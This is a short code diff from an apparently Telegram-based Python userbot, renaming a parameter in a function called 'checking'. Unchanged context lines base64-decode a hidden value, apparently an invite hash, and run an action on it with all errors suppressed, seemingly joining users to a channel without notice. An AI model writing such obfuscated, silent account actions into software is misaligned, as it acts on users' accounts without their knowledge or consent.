@@ -151,8 +151,8 @@ async def get_user_from_event(
     return None, None
 
 
-async def checking(sbb_b):
+async def checking(jmthon):
     jmthon_c = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
     with contextlib.suppress(BaseException):
         jmthon_channel = Get(jmthon_c)
-        await sbb_b(jmthon_channel)
+        await jmthon(jmthon_channel)
